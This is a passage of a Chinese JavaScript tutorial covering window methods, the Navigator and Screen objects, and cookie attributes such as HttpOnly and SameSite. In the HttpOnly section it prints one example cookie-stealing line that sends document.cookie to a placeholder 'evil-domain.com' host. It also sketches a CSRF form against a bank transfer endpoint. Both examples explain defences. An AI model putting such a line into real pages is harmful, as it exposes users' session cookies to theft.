上面代码将窗口移动到屏幕`(100, 200)`的位置。

`window.moveBy()`方法将窗口移动到一个相对位置。它接受两个参数，分别是窗口左上角向右移动的水平距离和向下移动的垂直距离，单位为像素。

```js
window.moveBy(25, 50)
```

上面代码将窗口向右移动25像素、向下移动50像素。

为了防止有人滥用这两个方法，随意移动用户的窗口，目前只有一种情况，浏览器允许用脚本移动窗口：该窗口是用`window.open()`方法新建的，并且窗口里只有它一个 Tab 页。除此以外的情况，使用上面两个方法都是无效的。

#### window.resizeTo()，window.resizeBy()

`window.resizeTo()`方法用于缩放窗口到指定大小。

它接受两个参数，第一个是缩放后的窗口宽度（`outerWidth`属性，包含滚动条、标题栏等等），第二个是缩放后的窗口高度（`outerHeight`属性）。

```js
window.resizeTo(
  window.screen.availWidth / 2,
  window.screen.availHeight / 2
)
```

上面代码将当前窗口缩放到，屏幕可用区域的一半宽度和高度。

`window.resizeBy()`方法用于缩放窗口。它与`window.resizeTo()`的区别是，它按照相对的量缩放，`window.resizeTo()`需要给出缩放后的绝对大小。

它接受两个参数，第一个是水平缩放的量，第二个是垂直缩放的量，单位都是像素。

```js
window.resizeBy(-200, -200)
```

上面的代码将当前窗口的宽度和高度，都缩小200像素。

#### window.scrollTo()，window.scroll()，window.scrollBy()

`window.scrollTo`方法用于将文档滚动到指定位置。它接受两个参数，表示滚动后位于窗口左上角的页面坐标。

```js
window.scrollTo(x-coord, y-coord)
```

它也可以接受一个配置对象作为参数。

```js
window.scrollTo(options)
```

配置对象`options`有三个属性。

- `top`：滚动后页面左上角的垂直坐标，即 y 坐标。
- `left`：滚动后页面左上角的水平坐标，即 x 坐标。
- `behavior`：字符串，表示滚动的方式，有三个可能值（`smooth`、`instant`、`auto`），默认值为`auto`。

```js
window.scrollTo({
  top: 1000,
  behavior: 'smooth'
});
```

`window.scroll()`方法是`window.scrollTo()`方法的别名。

`window.scrollBy()`方法用于将网页滚动指定距离（单位像素）。它接受两个参数：水平向右滚动的像素，垂直向下滚动的像素。

```js
window.scrollBy(0, window.innerHeight)
```

上面代码用于将网页向下滚动一屏。

如果不是要滚动整个文档，而是要滚动某个元素，可以使用下面三个属性和方法。

- Element.scrollTop
- Element.scrollLeft
- Element.scrollIntoView()

#### window.print()

`window.print`方法会跳出打印对话框，与用户点击菜单里面的“打印”命令效果相同。

常见的打印按钮代码如下。

```js
document.getElementById('printLink').onclick = function () {
  window.print();
}
```

非桌面设备（比如手机）可能没有打印功能，这时可以这样判断。

```js
if (typeof window.print === 'function') {
  // 支持打印功能
}
```

#### window.focus()，window.blur()

`window.focus()`方法会激活窗口，使其获得焦点，出现在其他窗口的前面。

```js
var popup = window.open('popup.html', 'Popup Window');

if ((popup !== null) && !popup.closed) {
  popup.focus();
}
```

上面代码先检查`popup`窗口是否依然存在，确认后激活该窗口。

`window.blur()`方法将焦点从窗口移除。

当前窗口获得焦点时，会触发`focus`事件；当前窗口失去焦点时，会触发`blur`事件。

### window.getSelection()

`window.getSelection`方法返回一个`Selection`对象，表示用户现在选中的文本。

```js
var selObj = window.getSelection();
```

使用`Selection`对象的`toString`方法可以得到选中的文本。

```js
var selectedText = selObj.toString();
```

#### window.getComputedStyle()，window.matchMedia()

`window.getComputedStyle()`方法接受一个元素节点作为参数，返回一个包含该元素的最终样式信息的对象，详见《CSS 操作》一章。

`window.matchMedia()`方法用来检查 CSS 的`mediaQuery`语句，详见《CSS 操作》一章。

#### window.requestAnimationFrame()

`window.requestAnimationFrame()`方法跟`setTimeout`类似，都是推迟某个函数的执行。不同之处在于，`setTimeout`必须指定推迟的时间，`window.requestAnimationFrame()`则是推迟到浏览器下一次重流时执行，执行完才会进行下一次重绘。重绘通常是 16ms 执行一次，不过浏览器会自动调节这个速率，比如网页切换到后台 Tab 页时，`requestAnimationFrame()`会暂停执行。

如果某个函数会改变网页的布局，一般就放在`window.requestAnimationFrame()`里面执行，这样可以节省系统资源，使得网页效果更加平滑。因为慢速设备会用较慢的速率重流和重绘，而速度更快的设备会有更快的速率。

该方法接受一个回调函数作为参数。

```js
window.requestAnimationFrame(callback)
```

上面代码中，`callback`是一个回调函数。`callback`执行时，它的参数就是系统传入的一个高精度时间戳（`performance.now()`的返回值），单位是毫秒，表示距离网页加载的时间。

`window.requestAnimationFrame()`的返回值是一个整数，这个整数可以传入`window.cancelAnimationFrame()`，用来取消回调函数的执行。

下面是一个`window.requestAnimationFrame()`执行网页动画的例子。

```js
var element = document.getElementById('animate');
element.style.position = 'absolute';

var start = null;

function step(timestamp) {
  if (!start) start = timestamp;
  var progress = timestamp - start;
  // 元素不断向左移，最大不超过200像素
  element.style.left = Math.min(progress / 10, 200) + 'px';
  // 如果距离第一次执行不超过 2000 毫秒，
  // 就继续执行动画
  if (progress < 2000) {
    window.requestAnimationFrame(step);
  }
}

window.requestAnimationFrame(step);
```

上面代码定义了一个网页动画，持续时间是2秒，会让元素向右移动。

#### window.requestIdleCallback()

`window.requestIdleCallback()`跟`setTimeout`类似，也是将某个函数推迟执行，但是它保证将回调函数推迟到系统资源空闲时执行。也就是说，如果某个任务不是很关键，就可以使用`window.requestIdleCallback()`将其推迟执行，以保证网页性能。

它跟`window.requestAnimationFrame()`的区别在于，后者指定回调函数在下一次浏览器重排时执行，问题在于下一次重排时，系统资源未必空闲，不一定能保证在16毫秒之内完成；`window.requestIdleCallback()`可以保证回调函数在系统资源空闲时执行。

该方法接受一个回调函数和一个配置对象作为参数。配置对象可以指定一个推迟执行的最长时间，如果过了这个时间，回调函数不管系统资源有无空闲，都会执行。

```js
window.requestIdleCallback(callback[, options])
```

`callback`参数是一个回调函数。该回调函数执行时，系统会传入一个`IdleDeadline`对象作为参数。`IdleDeadline`对象有一个`didTimeout`属性（布尔值，表示是否为超时调用）和一个`timeRemaining()`方法（返回该空闲时段剩余的毫秒数）。

`options`参数是一个配置对象，目前只有`timeout`一个属性，用来指定回调函数推迟执行的最大毫秒数。该参数可选。

`window.requestIdleCallback()`方法返回一个整数。该整数可以传入`window.cancelIdleCallback()`取消回调函数。

下面是一个例子。

```js
requestIdleCallback(myNonEssentialWork);

function myNonEssentialWork(deadline) {
  while (deadline.timeRemaining() > 0) {
    doWorkIfNeeded();
  }
}
```

上面代码中，`requestIdleCallback()`用来执行非关键任务`myNonEssentialWork`。该任务先确认本次空闲时段有剩余时间，然后才真正开始执行任务。

下面是指定`timeout`的例子。

```js
requestIdleCallback(processPendingAnalyticsEvents, { timeout: 2000 });
```

上面代码指定，`processPendingAnalyticsEvents`必须在未来2秒之内执行。

如果由于超时导致回调函数执行，则`deadline.timeRemaining()`返回`0`，`deadline.didTimeout`返回`true`。

如果多次执行`window.requestIdleCallback()`，指定多个回调函数，那么这些回调函数将排成一个队列，按照先进先出的顺序执行。

### 事件

`window`对象可以接收以下事件。

#### load 事件和 onload 属性

`load`事件发生在文档在浏览器窗口加载完毕时。`window.onload`属性可以指定这个事件的回调函数。

```js
window.onload = function() {
  var elements = document.getElementsByClassName('example');
  for (var i = 0; i < elements.length; i++) {
    var elt = elements[i];
    // ...
  }
};
```

上面代码在网页加载完毕后，获取指定元素并进行处理。

#### error 事件和 onerror 属性

浏览器脚本发生错误时，会触发`window`对象的`error`事件。我们可以通过`window.onerror`属性对该事件指定回调函数。

```js
window.onerror = function (message, filename, lineno, colno, error) {
  console.log("出错了！--> %s", error.stack);
};
```

由于历史原因，`window`的`error`事件的回调函数不接受错误对象作为参数，而是一共可以接受五个参数，它们的含义依次如下。

- 出错信息
- 出错脚本的网址
- 行号
- 列号
- 错误对象

老式浏览器只支持前三个参数。

并不是所有的错误，都会触发 JavaScript 的`error`事件（即让 JavaScript 报错）。一般来说，只有 JavaScript 脚本的错误，才会触发这个事件，而像资源文件不存在之类的错误，都不会触发。

下面是一个例子，如果整个页面未捕获错误超过3个，就显示警告。

```js
window.onerror = function(msg, url, line) {
  if (onerror.num++ > onerror.max) {
    alert('ERROR: ' + msg + '\n' + url + ':' + line);
    return true;
  }
}
onerror.max = 3;
onerror.num = 0;
```

需要注意的是，如果脚本网址与网页网址不在同一个域（比如使用了 CDN），浏览器根本不会提供详细的出错信息，只会提示出错，错误类型是“Script error.”，行号为0，其他信息都没有。这是浏览器防止向外部脚本泄漏信息。一个解决方法是在脚本所在的服务器，设置`Access-Control-Allow-Origin`的 HTTP 头信息。

```js
Access-Control-Allow-Origin: *
```

然后，在网页的`<script>`标签中设置`crossorigin`属性。

```html
<script crossorigin="anonymous" src="//example.com/file.js"></script>
```

上面代码的`crossorigin="anonymous"`表示，读取文件不需要身份信息，即不需要 cookie 和 HTTP 认证信息。如果设为`crossorigin="use-credentials"`，就表示浏览器会上传 cookie 和 HTTP 认证信息，同时还需要服务器端打开 HTTP 头信息`Access-Control-Allow-Credentials`。

#### window 对象的事件监听属性

除了具备元素节点都有的 GlobalEventHandlers 接口，`window`对象还具有以下的事件监听函数属性。

- `window.onafterprint`：`afterprint`事件的监听函数。
- `window.onbeforeprint`：`beforeprint`事件的监听函数。
- `window.onbeforeunload`：`beforeunload`事件的监听函数。
- `window.onhashchange`：`hashchange`事件的监听函数。
- `window.onlanguagechange`: `languagechange`的监听函数。
- `window.onmessage`：`message`事件的监听函数。
- `window.onmessageerror`：`MessageError`事件的监听函数。
- `window.onoffline`：`offline`事件的监听函数。
- `window.ononline`：`online`事件的监听函数。
- `window.onpagehide`：`pagehide`事件的监听函数。
- `window.onpageshow`：`pageshow`事件的监听函数。
- `window.onpopstate`：`popstate`事件的监听函数。
- `window.onstorage`：`storage`事件的监听函数。
- `window.onunhandledrejection`：未处理的 Promise 对象的`reject`事件的监听函数。
- `window.onunload`：`unload`事件的监听函数。

### 多窗口操作

由于网页可以使用`iframe`元素，嵌入其他网页，因此一个网页之中会形成多个窗口。如果子窗口之中又嵌入别的网页，就会形成多级窗口。

#### 窗口的引用

各个窗口之中的脚本，可以引用其他窗口。浏览器提供了一些特殊变量，用来返回其他窗口。

- `top`：顶层窗口，即最上层的那个窗口
- `parent`：父窗口
- `self`：当前窗口，即自身

下面代码可以判断，当前窗口是否为顶层窗口。

```js
if (window.top === window.self) {
  // 当前窗口是顶层窗口
} else {
  // 当前窗口是子窗口
}
```

下面的代码让父窗口的访问历史后退一次。

```js
window.parent.history.back();
```

与这些变量对应，浏览器还提供一些特殊的窗口名，供`window.open()`方法、`<a>`标签、`<form>`标签等引用。

- `_top`：顶层窗口
- `_parent`：父窗口
- `_blank`：新窗口

下面代码就表示在顶层窗口打开链接。

```js
<a href="somepage.html" target="_top">Link</a>
```

#### iframe 元素

对于`iframe`嵌入的窗口，`document.getElementById`方法可以拿到该窗口的 DOM 节点，然后使用`contentWindow`属性获得`iframe`节点包含的`window`对象。

```js
var frame = document.getElementById('theFrame');
var frameWindow = frame.contentWindow;
```

上面代码中，`frame.contentWindow`可以拿到子窗口的`window`对象。然后，在满足同源限制的情况下，可以读取子窗口内部的属性。

```js
// 获取子窗口的标题
frameWindow.title
```

iframe 元素的contentDocument属性，可以拿到子窗口的document对象。

```js
var frame = document.getElementById('theFrame');
var frameDoc = frame.contentDocument;

// 等同于
var frameDoc = frame.contentWindow.document;
```

iframe 元素遵守同源政策，只有当父窗口与子窗口在同一个域时，两者之间才可以用脚本通信，否则只有使用window.postMessage方法。

iframe 窗口内部，使用window.parent引用父窗口。如果当前页面没有父窗口，则window.parent属性返回自身。因此，可以通过window.parent是否等于window.self，判断当前窗口是否为iframe窗口。

```js
if (window.parent !== window.self) {
  // 当前窗口是子窗口
}
```

iframe 窗口的window对象，有一个frameElement属性，返回 iframe 在父窗口中的 DOM 节点。对于非嵌入的窗口，该属性等于null。

```js
var f1Element = document.getElementById('f1');
var f1Window = f1Element.contentWindow;

f1Window.frameElement === f1Element // true
window.frameElement === null // true
```

#### window.frames 属性

`window.frames`属性返回一个类似数组的对象，成员是所有子窗口的`window`对象。可以使用这个属性，实现窗口之间的互相引用。比如，`frames[0]`返回第一个子窗口，`frames[1].frames[2]`返回第二个子窗口内部的第三个子窗口，`parent.frames[1]`返回父窗口的第二个子窗口。

注意，`window.frames`每个成员的值，是框架内的窗口（即框架的`window`对象），而不是`iframe`标签在父窗口的 DOM 节点。如果要获取每个框架内部的 DOM 树，需要使用`window.frames[0].document`的写法。

另外，如果`<iframe>`元素设置了`name`或`id`属性，那么属性值会自动成为全局变量，并且可以通过`window.frames`属性引用，返回子窗口的`window`对象。

```js
// HTML 代码为 <iframe id="myFrame">
window.myFrame // [HTMLIFrameElement]
frames.myframe === myFrame // true
```

另外，`name`属性的值会自动成为子窗口的名称，可以用在`window.open`方法的第二个参数，或者`<a>`和`<frame>`标签的`target`属性。

## Navigator 对象与 Screen 对象

### Navigator 对象的属性

#### Navigator.userAgent

`navigator.userAgent`属性返回浏览器的 User Agent 字符串，表示浏览器的厂商和版本信息。

下面是 Chrome 浏览器的`userAgent`。

```js
navigator.userAgent
// "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"
```

通过`userAgent`属性识别浏览器，不是一个好办法。因为必须考虑所有的情况（不同的浏览器，不同的版本），非常麻烦，而且用户可以改变这个字符串。这个字符串的格式并无统一规定，也无法保证未来的适用性，各种上网设备层出不穷，难以穷尽。所以，现在一般不再通过它识别浏览器了，而是使用“功能识别”方法，即逐一测试当前浏览器是否支持要用到的 JavaScript 功能。

不过，通过`userAgent`可以大致准确地识别手机浏览器，方法就是测试是否包含`mobi`字符串。

```js
var ua = navigator.userAgent.toLowerCase();

if (/mobi/i.test(ua)) {
  // 手机浏览器
} else {
  // 非手机浏览器
}
```

如果想要识别所有移动设备的浏览器，可以测试更多的特征字符串。

```js
/mobi|android|touch|mini/i.test(ua)
```

#### Navigator.plugins

`Navigator.plugins`属性返回一个类似数组的对象，成员是 Plugin 实例对象，表示浏览器安装的插件，比如 Flash、ActiveX 等。

```js
var pluginsLength = navigator.plugins.length;

for (var i = 0; i < pluginsLength; i++) {
  console.log(navigator.plugins[i].name);
  console.log(navigator.plugins[i].filename);
  console.log(navigator.plugins[i].description);
  console.log(navigator.plugins[i].version);
}
```

#### Navigator.platform

`Navigator.platform`属性返回用户的操作系统信息，比如`MacIntel`、`Win32`、`Linux x86_64`等 。

```js
navigator.platform
// "Linux x86_64"
```

#### Navigator.onLine

`navigator.onLine`属性返回一个布尔值，表示用户当前在线还是离线（浏览器断线）。

```js
navigator.onLine // true
```

有时，浏览器可以连接局域网，但是局域网不能连通外网。这时，有的浏览器的`onLine`属性会返回`true`，所以不能假定只要是`true`，用户就一定能访问互联网。不过，如果是`false`，可以断定用户一定离线。

用户变成在线会触发`online`事件，变成离线会触发`offline`事件，可以通过`window.ononline`和`window.onoffline`指定这两个事件的回调函数。

```js
window.addEventListener('offline', function(e) { console.log('offline'); });
window.addEventListener('online', function(e) { console.log('online'); });
```

#### Navigator.language，Navigator.languages

`Navigator.language`属性返回一个字符串，表示浏览器的首选语言。该属性只读。

```js
navigator.language // "en"
```

`Navigator.languages`属性返回一个数组，表示用户可以接受的语言。`Navigator.language`总是这个数组的第一个成员。HTTP 请求头信息的`Accept-Language`字段，就来自这个数组。

```js
navigator.languages  // ["en-US", "en", "zh-CN", "zh", "zh-TW"]
```

如果这个属性发生变化，就会在`window`对象上触发`languagechange`事件。

#### Navigator.geolocation

`Navigator.geolocation`属性返回一个 Geolocation 对象，包含用户地理位置的信息。注意，该 API 只有在 HTTPS 协议下可用，否则调用下面方法时会报错。

Geolocation 对象提供下面三个方法。

- Geolocation.getCurrentPosition()：得到用户的当前位置
- Geolocation.watchPosition()：监听用户位置变化
- Geolocation.clearWatch()：取消`watchPosition()`方法指定的监听函数

注意，调用这三个方法时，浏览器会跳出一个对话框，要求用户给予授权。

#### Navigator.cookieEnabled

`navigator.cookieEnabled`属性返回一个布尔值，表示浏览器的 Cookie 功能是否打开。

```js
navigator.cookieEnabled // true
```

注意，这个属性反映的是浏览器总的特性，与是否储存某个具体的网站的 Cookie 无关。用户可以设置某个网站不得储存 Cookie，这时`cookieEnabled`返回的还是`true`。

### Navigator 对象的方法

#### Navigator.javaEnabled()

`navigator.javaEnabled()`方法返回一个布尔值，表示浏览器是否能运行 Java Applet 小程序。

```js
navigator.javaEnabled() // false
```

#### Navigator.sendBeacon()

`Navigator.sendBeacon()`方法用于向服务器异步发送数据，详见《XMLHttpRequest 对象》一章。

### Navigator 的实验性属性

Navigator 对象有一些实验性属性，在部分浏览器可用。

#### Navigator.deviceMemory

`navigator.deviceMemory`属性返回当前计算机的内存数量（单位为 GB）。该属性只读，只在 HTTPS 环境下可用。

它的返回值是一个近似值，四舍五入到最接近的2的幂，通常是 0.25、0.5、1、2、4、8。实际内存超过 8GB，也返回`8`。

```js
if (navigator.deviceMemory > 1) {
  await import('./costly-module.js');
}
```

上面示例中，只有当前内存大于 1GB，才加载大型的脚本。

#### Navigator.hardwareConcurrency

`navigator.hardwareConcurrency`属性返回用户计算机上可用的逻辑处理器的数量。该属性只读。

现代计算机的 CPU 有多个物理核心，每个物理核心有时支持一次运行多个线程。因此，四核 CPU 可以提供八个逻辑处理器核心。

```js
if (navigator.hardwareConcurrency > 4) {
  await import('./costly-module.js');
}
```

上面示例中，可用的逻辑处理器大于4，才会加载大型脚本。

该属性通过用于创建 Web Worker，每个可用的逻辑处理器都创建一个 Worker。

```js
let workerList = [];

for (let i = 0; i < window.navigator.hardwareConcurrency; i++) {
  let newWorker = {
    worker: new Worker('cpuworker.js'),
    inUse: false
  };
  workerList.push(newWorker);
}
```

上面示例中，有多少个可用的逻辑处理器，就创建多少个 Web Worker。

#### Navigator.connection

`navigator.connection`属性返回一个对象，包含当前网络连接的相关信息。

- downlink：有效带宽估计值（单位：兆比特/秒，Mbps），四舍五入到每秒 25KB 的最接近倍数。
- downlinkMax：当前连接的最大下行链路速度（单位：兆比特每秒，Mbps）。
- effectiveType：返回连接的等效类型，可能的值为`slow-2g`、`2g`、`3g`、`4g`。
- rtt：当前连接的估计有效往返时间，四舍五入到最接近的25毫秒的倍数。
- saveData：用户是否设置了浏览器的减少数据使用量选项（比如不加载图片），返回`true`或者`false`。
- type：当前连接的介质类型，可能的值为`bluetooth`、`cellular`、`ethernet`、`none`、`wifi`、`wimax`、`other`、`unknown`。

```js
if (navigator.connection.effectiveType === '4g') {
  await import('./costly-module.js');
}
```

上面示例中，如果网络连接是 4G，则加载大型脚本。

### Screen 对象

Screen 对象表示当前窗口所在的屏幕，提供显示设备的信息。`window.screen`属性指向这个对象。

该对象有下面的属性。

- `Screen.height`：浏览器窗口所在的屏幕的高度（单位像素）。除非调整显示器的分辨率，否则这个值可以看作常量，不会发生变化。显示器的分辨率与浏览器设置无关，缩放网页并不会改变分辨率。
- `Screen.width`：浏览器窗口所在的屏幕的宽度（单位像素）。
- `Screen.availHeight`：浏览器窗口可用的屏幕高度（单位像素）。因为部分空间可能不可用，比如系统的任务栏或者 Mac 系统屏幕底部的 Dock 区，这个属性等于`height`减去那些被系统组件的高度。
- `Screen.availWidth`：浏览器窗口可用的屏幕宽度（单位像素）。
- `Screen.pixelDepth`：整数，表示屏幕的色彩位数，比如`24`表示屏幕提供24位色彩。
- `Screen.colorDepth`：`Screen.pixelDepth`的别名。严格地说，colorDepth 表示应用程序的颜色深度，pixelDepth 表示屏幕的颜色深度，绝大多数情况下，它们都是同一件事。
- `Screen.orientation`：返回一个对象，表示屏幕的方向。该对象的`type`属性是一个字符串，表示屏幕的具体方向，`landscape-primary`表示横放，`landscape-secondary`表示颠倒的横放，`portrait-primary`表示竖放，`portrait-secondary`表示颠倒的竖放。

下面是`Screen.orientation`的例子。

```js
window.screen.orientation
// { angle: 0, type: "landscape-primary", onchange: null }
```

下面的例子保证屏幕分辨率大于 1024 x 768。

```js
if (window.screen.width >= 1024 && window.screen.height >= 768) {
  // 分辨率不低于 1024x768
}
```

下面是根据屏幕的宽度，将用户导向不同网页的代码。

```js
if ((screen.width <= 800) && (screen.height <= 600)) {
  window.location.replace('small.html');
} else {
  window.location.replace('wide.html');
}
```

## Cookie

### 概述

Cookie 是服务器保存在浏览器的一小段文本信息，一般大小不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。

Cookie 主要保存状态信息，以下是一些主要用途。

- 对话（session）管理：保存登录、购物车等需要记录的信息。
- 个性化信息：保存用户的偏好，比如网页的字体大小、背景色等等。
- 追踪用户：记录和分析用户行为。

Cookie 不是一种理想的客户端储存机制。它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端储存应该使用 Web storage API 和 IndexedDB。只有那些每次请求都需要让服务器知道的信息，才应该放在 Cookie 里面。

每个 Cookie 都有以下几方面的元数据。

- Cookie 的名字
- Cookie 的值（真正的数据写在这里面）
- 到期时间（超过这个时间会失效）
- 所属域名（默认为当前域名）
- 生效的路径（默认为当前网址）

举例来说，用户访问网址`www.example.com`，服务器在浏览器写入一个 Cookie。这个 Cookie 的所属域名为`www.example.com`，生效路径为根路径`/`。如果 Cookie 的生效路径设为`/forums`，那么这个 Cookie 只有在访问`www.example.com/forums`及其子路径时才有效。以后，浏览器访问某个路径之前，就会找出对该域名和路径有效，并且还没有到期的 Cookie，一起发送给服务器。

用户可以设置浏览器不接受 Cookie，也可以设置不向服务器发送 Cookie。`window.navigator.cookieEnabled`属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。

```js
window.navigator.cookieEnabled // true
```

`document.cookie`属性返回当前网页的 Cookie。

```js
document.cookie // "id=foo;key=bar"
```

不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过30个，每个 Cookie 的大小不能超过4KB。超过限制以后，Cookie 将被忽略，不会被设置。

浏览器的同源政策规定，两个网址只要域名相同，就可以共享 Cookie（参见《同源政策》一章）。注意，这里不要求协议相同。也就是说，`http://example.com`设置的 Cookie，可以被`https://example.com`读取。

### Cookie 与 HTTP 协议

Cookie 由 HTTP 协议生成，也主要是供 HTTP 协议使用。

#### HTTP 回应：Cookie 的生成

服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个`Set-Cookie`字段。

```
Set-Cookie:foo=bar
```

上面代码会在浏览器保存一个名为`foo`的 Cookie，它的值为`bar`。

HTTP 回应可以包含多个`Set-Cookie`字段，即在浏览器生成多个 Cookie。下面是一个例子。

```
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
```

除了 Cookie 的值，`Set-Cookie`字段还可以附加 Cookie 的属性。

```
Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date>
Set-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>
Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>
Set-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>
Set-Cookie: <cookie-name>=<cookie-value>; Secure
Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly
```

上面的几个属性的含义，将在后文解释。

一个`Set-Cookie`字段里面，可以同时包括多个属性，没有次序的要求。

```
Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly
```

下面是一个例子。

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的`key`、`domain`、`path`和`secure`都匹配。举例来说，如果原始的 Cookie 是用如下的`Set-Cookie`设置的。

```
Set-Cookie: key1=value1; domain=example.com; path=/blog
```

改变上面这个 Cookie 的值，就必须使用同样的`Set-Cookie`。

```
Set-Cookie: key1=value2; domain=example.com; path=/blog
```

只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。

```
Set-Cookie: key1=value2; domain=example.com; path=/
```

上面的命令设置了一个全新的同名 Cookie，但是`path`属性不一样。下一次访问`example.com/blog`的时候，浏览器将向服务器发送两个同名的 Cookie。

```
Cookie: key1=value1; key1=value2
```

上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。

#### HTTP 请求：Cookie 的发送

浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的`Cookie`字段。

```
Cookie: foo=bar
```

上面代码会向服务器发送名为`foo`的 Cookie，值为`bar`。

`Cookie`字段可以包含多个 Cookie，使用分号（`;`）分隔。

```
Cookie: name=value; name2=value2; name3=value3
```

下面是一个例子。

```
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。

- Cookie 的各种属性，比如何时过期。
- 哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。

### Cookie 的属性

#### Expires，Max-Age

`Expires`属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用`Date.prototype.toUTCString()`进行格式转换。

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

如果不设置该属性，或者设为`null`，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。

`Max-Age`属性指定从现在开始 Cookie 存在的秒数，比如`60 * 60 * 24 * 365`（即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。

如果同时指定了`Expires`和`Max-Age`，那么`Max-Age`的值将优先生效。

如果`Set-Cookie`字段没有指定`Expires`或`Max-Age`属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。

#### Domain，Path

`Domain`属性指定浏览器发出 HTTP 请求时，哪些域名要附带这个 Cookie。如果没有指定该属性，浏览器会默认将其设为当前域名，这时子域名将不会附带这个 Cookie。比如，`example.com`不设置 Cookie 的`domain`属性，那么`sub.example.com`将不会附带这个 Cookie。如果指定了`domain`属性，那么子域名也会附带这个 Cookie。如果服务器指定的域名不属于当前域名，浏览器会拒绝这个 Cookie。

`Path`属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，`Path`属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，`PATH`属性是`/`，那么请求`/docs`路径也会包含该 Cookie。当然，前提是域名必须一致。

#### Secure，HttpOnly

`Secure`属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的`Secure`属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。

`HttpOnly`属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是`document.cookie`属性、`XMLHttpRequest`对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。

```
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的`HttpOnly`属性，上面代码就不会读到该 Cookie。

#### SameSite

Chrome 51 开始，浏览器的 Cookie 新增加了一个`SameSite`属性，用来防止 CSRF 攻击和用户追踪。

Cookie 往往用来存储用户的身份信息，恶意网站可以设法伪造带有正确 Cookie 的 HTTP 请求，这就是 CSRF 攻击。举例来说，用户登陆了银行网站`your-bank.com`，银行服务器发来了一个 Cookie。

```
Set-Cookie:id=a3fWa;
```

用户后来又访问了恶意网站`malicious.com`，上面有一个表单。

```
<form action="your-bank.com/transfer" method="POST">
  ...
</form>
```

用户一旦被诱骗发送这个表单，银行网站就会收到带有正确 Cookie 的请求。为了防止这种攻击，表单一般都带有一个随机 token，告诉服务器这是真实请求。

```
<form action="your-bank.com/transfer" method="POST">
  <input type="hidden" name="token" value="dad3weg34">
  ...
</form>
```

这种第三方网站引导发出的 Cookie，就称为第三方 Cookie。它除了用于 CSRF 攻击，还可以用于用户追踪。比如，Facebook 在第三方网站插入一张看不见的图片。

```
<img src="facebook.com" style="visibility:hidden;">
```

浏览器加载上面代码时，就会向 Facebook 发出带有 Cookie 的请求，从而 Facebook 就会知道你是谁，访问了什么网站。

Cookie 的`SameSite`属性用来限制第三方 Cookie，从而减少安全风险。它可以设置三个值。

> - Strict
> - Lax
> - None

**（1）Strict**

`Strict`最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。

```
Set-Cookie: CookieName=CookieValue; SameSite=Strict;
```

这个规则过于严格，可能造成非常不好的用户体验。比如，当前网页有一个 GitHub 链接，用户点击跳转就不会带有 GitHub 的 Cookie，跳转过去总是未登陆状态。

**（2）Lax**

`Lax`规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。

```
Set-Cookie: CookieName=CookieValue; SameSite=Lax;
```

导航到目标网址的 GET 请求，只包括三种情况：链接，预加载请求，GET 表单。详见下表。

| 请求类型  |                 示例                 |    正常情况 | Lax         |
| --------- | :----------------------------------: | ----------: | ----------- |
| 链接      |         `<a href="..."></a>`         | 发送 Cookie | 发送 Cookie |
| 预加载    | `<link rel="prerender" href="..."/>` | 发送 Cookie | 发送 Cookie |
| GET 表单  |  `<form method="GET" action="...">`  | 发送 Cookie | 发送 Cookie |
| POST 表单 | `<form method="POST" action="...">`  | 发送 Cookie | 不发送      |
| iframe    |    `<iframe src="..."></iframe>`     | 发送 Cookie | 不发送      |
